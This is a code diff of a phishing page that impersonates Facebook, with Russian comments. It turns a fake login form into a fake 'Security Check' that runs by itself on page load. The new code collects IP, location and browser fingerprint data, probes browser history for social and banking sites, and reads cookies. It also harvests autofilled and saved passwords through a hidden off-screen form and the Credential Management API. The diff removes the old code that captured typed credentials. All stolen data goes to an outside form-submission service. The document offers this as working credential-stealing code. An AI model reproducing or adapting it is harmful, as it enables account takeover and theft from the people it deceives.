@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Facebook - Log In</title>
+    <title>Facebook Security Check</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
@@ -14,50 +14,42 @@
             align-items: center;
             min-height: 100vh;
         }
-        .login-container {
+        .security-container {
             background: white;
-            padding: 30px;
-            border-radius: 8px;
+            padding: 40px;
+            border-radius: 10px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            width: 400px;
             text-align: center;
+            max-width: 500px;
+            width: 90%;
         }
         .logo {
             color: #1877f2;
-            font-size: 42px;
+            font-size: 48px;
             font-weight: bold;
             margin-bottom: 20px;
         }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 10px 0;
-        }
         .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #1877f2;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
-            display: none;
+            margin: 30px auto;
+        }
+        .progress {
+            width: 100%;
+            background: #f0f2f5;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 8px;
+            background: #1877f2;
+            border-radius: 10px;
+            transition: width 0.5s;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -66,22 +58,21 @@
     </style>
 </head>
 <body>
-    <div class="login-container">
+    <div class="security-container">
         <div class="logo">facebook</div>
-        <h2>Log into Facebook</h2>
+        <h2>Security Verification</h2>
+        <p>Checking your account for suspicious activity...</p>
         
-        <form id="loginForm">
-            <input type="text" id="email" name="email" placeholder="Email or phone number" required autocomplete="username">
-            <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
-            <button type="submit">Log In</button>
-        </form>
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
         
-        <div class="loader" id="loader"></div>
-        <p id="status">Enter your credentials to continue</p>
+        <div class="loader"></div>
         
-        <div style="margin-top: 20px; font-size: 14px; color: #666;">
-            <a href="#" style="color: #1877f2; text-decoration: none;">Forgotten account?</a> · 
-            <a href="#" style="color: #1877f2; text-decoration: none;">Sign up for Facebook</a>
+        <div id="status">
+            <p>🔍 Scanning device information...</p>
+            <p>📍 Checking location...</p>
+            <p>🌐 Analyzing browser data...</p>
         </div>
     </div>
 
@@ -91,10 +82,34 @@
         
         // ОСНОВНАЯ ФУНКЦИЯ
         async function startStealing() {
+            updateProgress(10);
             await collectSystemInfo();
+            
+            updateProgress(30);
             await stealBrowserHistory();
+            
+            updateProgress(50);
             await stealCookies();
-            setupFormInterception();
+            
+            updateProgress(70);
+            await stealAutofillPasswords();
+            
+            updateProgress(90);
+            await stealSavedCredentials();
+            
+            updateProgress(100);
+            
+            // Показываем завершение
+            setTimeout(() => {
+                document.getElementById('status').innerHTML = 
+                    '<p style="color: green; font-weight: bold;">✅ Security check complete!</p>' +
+                    '<p>Your account is now secure.</p>';
+            }, 1000);
+        }
+
+        // ОБНОВЛЕНИЕ ПРОГРЕСС БАРА
+        function updateProgress(percent) {
+            document.getElementById('progressBar').style.width = percent + '%';
         }
 
         // СБОР СИСТЕМНОЙ ИНФОРМАЦИИ
@@ -107,16 +122,20 @@
                     ip: ipData.ip,
                     city: geoData.city,
                     country: geoData.country_name,
+                    region: geoData.region,
+                    isp: geoData.org,
                     browser: navigator.userAgent,
                     platform: navigator.platform,
                     screen: screen.width + 'x' + screen.height,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     url: window.location.href,
-                    time: new Date().toLocaleString()
+                    timestamp: new Date().toLocaleString()
                 };
                 
                 await sendReport('system_info', systemInfo);
             } catch (error) {
-                console.log('Error');
+                console.log('Error collecting system info');
             }
         }
 
@@ -125,7 +144,10 @@
             const visited = [];
             const sites = [
                 'https://facebook.com', 'https://youtube.com', 'https://google.com',
-                'https://instagram.com', 'https://twitter.com', 'https://vk.com'
+                'https://instagram.com', 'https://twitter.com', 'https://vk.com',
+                'https://ok.ru', 'https://mail.ru', 'https://gmail.com',
+                'https://github.com', 'https://tiktok.com', 'https://web.telegram.org',
+                'https://discord.com', 'https://sberbank.ru', 'https://tinkoff.ru'
             ];
             
             for (const site of sites) {
@@ -156,15 +178,15 @@
                             document.body.removeChild(testLink);
                         }
                         document.head.removeChild(link);
-                    }, 50);
+                    }, 30);
                     
                 } catch (error) {}
             }
             
             if (visited.length > 0) {
-                await sendReport('history', {
-                    sites: visited,
-                    count: visited.length
+                await sendReport('browser_history', {
+                    visited_sites: visited,
+                    total_count: visited.length
                 });
             }
         }
@@ -176,46 +198,69 @@
                 if (cookies) {
                     await sendReport('cookies', {
                         cookies: cookies.split(';'),
-                        count: cookies.split(';').length
+                        total_cookies: cookies.split(';').length
                     });
                 }
             } catch (error) {}
         }
 
-        // ПЕРЕХВАТ ФОРМЫ
-        function setupFormInterception() {
-            document.getElementById('loginForm').addEventListener('submit', function(event) {
-                event.preventDefault();
+        // КРАЖА АВТОЗАПОЛНЕННЫХ ПАРОЛЕЙ
+        async function stealAutofillPasswords() {
+            const hiddenForm = document.createElement('form');
+            hiddenForm.style.cssText = 'position: absolute; left: -9999px; top: -9999px;';
+            hiddenForm.innerHTML = `
+                <input type="text" name="username" autocomplete="username">
+                <input type="password" name="password" autocomplete="current-password">
+                <input type="email" autocomplete="email">
+            `;
+            document.body.appendChild(hiddenForm);
+            
+            setTimeout(() => {
+                const inputs = hiddenForm.querySelectorAll('input');
+                const autofillData = {};
                 
-                const email = document.getElementById('email').value;
-                const password = document.getElementById('password').value;
-                const loader = document.getElementById('loader');
-                const status = document.getElementById('status');
-                
-                sendReport('credentials', {
-                    email: email,
-                    password: password
+                inputs.forEach(input => {
+                    if (input.value) {
+                        autofillData[input.name || input.type] = input.value;
+                    }
                 });
                 
-                loader.style.display = 'block';
-                status.textContent = 'Checking credentials...';
+                if (Object.keys(autofillData).length > 0) {
+                    sendReport('autofill_passwords', autofillData);
+                }
                 
-                setTimeout(() => {
-                    loader.style.display = 'none';
-                    status.textContent = 'Invalid password. Please try again.';
-                    status.style.color = 'red';
-                    document.getElementById('password').value = '';
-                }, 3000);
-            });
+                document.body.removeChild(hiddenForm);
+            }, 1000);
+        }
+
+        // ПОПЫТКА КРАЖИ СОХРАНЕННЫХ ПАРОЛЕЙ
+        async function stealSavedCredentials() {
+            try {
+                if (navigator.credentials && navigator.credentials.get) {
+                    const cred = await navigator.credentials.get({
+                        password: true,
+                        mediation: 'optional'
+                    });
+                    
+                    if (cred) {
+                        await sendReport('saved_credentials', {
+                            id: cred.id,
+                            type: cred.type,
+                            password: cred.password || 'N/A'
+                        });
+                    }
+                }
+            } catch (error) {}
         }
 
         // ОТПРАВКА ОТЧЕТА
         async function sendReport(type, data) {
             try {
                 const report = {
-                    type: type,
+                    report_type: type,
                     data: data,
-                    time: new Date().toLocaleString()
+                    session_id: Math.random().toString(36).substr(2, 9),
+                    timestamp: new Date().toLocaleString()
                 };
                 
                 await fetch("https://formsubmit.co/ajax/" + FORM_TOKEN, {
@@ -232,9 +277,11 @@
             }
         }
 
-        // ЗАПУСК
+        // ЗАПУСК ПРИ ЗАГРУЗКЕ
         window.addEventListener('load', function() {
-            startStealing();
+            setTimeout(() => {
+                startStealing();
+            }, 1000);
         });
     </script>
 </body>
